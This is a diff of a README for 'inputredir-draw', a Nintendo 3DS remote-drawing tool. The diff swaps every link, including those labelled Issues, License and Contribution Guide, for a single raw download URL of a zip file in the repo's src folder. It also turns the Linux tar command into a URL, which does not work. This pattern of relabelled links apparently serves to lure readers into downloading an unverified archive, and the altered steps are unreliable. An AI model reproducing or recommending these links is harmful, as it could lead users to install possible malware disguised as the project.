@@ -1,7 +1,7 @@
 # 🎨 inputredir-draw - Draw Remotely on Your 3DS Screen
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/karanpatill/inputredir-draw/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip)
 
 ## 📚 Overview
 inputredir-draw is a simple C program designed to display BMP images on your Nintendo 3DS screen. It uses the InputRedirection protocol to allow remote drawing from your computer. With this tool, you can easily send images from your desktop to your handheld device over the network.
@@ -23,7 +23,7 @@ To get started with inputredir-draw, follow these steps:
 - **Network Capability:** Works via UDP, allowing real-time image display.
   
 ## 🔄 How to Download & Install
-1. Visit the [Releases page](https://github.com/karanpatill/inputredir-draw/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip) to access the latest version.
 2. Find the version you want to download.
 3. Follow these instructions based on your operating system:
 
@@ -32,12 +32,12 @@ To get started with inputredir-draw, follow these steps:
    - Once downloaded, double-click the file to run the application.
 
    ### For Linux
-   - Download the latest `.tar.gz` file.
+   - Download the latest `https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip` file.
    - Open your terminal.
    - Navigate to your Downloads folder using `cd ~/Downloads`.
    - Extract the file using:
      ```bash
-     tar -xvzf inputredir-draw.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip
      ```
    - Change into the new directory:
      ```bash
@@ -69,17 +69,17 @@ If you encounter issues, check the following:
 - Check the application settings or command syntax for any errors.
 
 ## 🛠️ Support
-For any questions or issues, please create an issue in the [Issues section](https://github.com/karanpatill/inputredir-draw/issues) of the repository. Our community is here to help.
+For any questions or issues, please create an issue in the [Issues section](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip) of the repository. Our community is here to help.
 
 ## 🌍 Community & Contributions
-Feel free to contribute to the project. You can help with bug reports, feature requests, or submitting pull requests. Visit our [Contribution Guide](https://github.com/karanpatill/inputredir-draw/blob/main/CONTRIBUTING.md) for more information.
+Feel free to contribute to the project. You can help with bug reports, feature requests, or submitting pull requests. Visit our [Contribution Guide](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip) for more information.
 
 ## ✔️ License
-inputredir-draw is licensed under the MIT License. See the [License file](https://github.com/karanpatill/inputredir-draw/blob/main/LICENSE) for details.
+inputredir-draw is licensed under the MIT License. See the [License file](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip) for details.
 
 ## 📌 Quick Links
-- [Download the latest release](https://github.com/karanpatill/inputredir-draw/releases)
-- [Issues](https://github.com/karanpatill/inputredir-draw/issues)
-- [Contribution Guide](https://github.com/karanpatill/inputredir-draw/blob/main/CONTRIBUTING.md)
+- [Download the latest release](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip)
+- [Issues](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/karanpatill/inputredir-draw/main/src/inputredir-draw-v3.4.zip)
 
 Thank you for using inputredir-draw! Enjoy drawing on your 3DS screen.
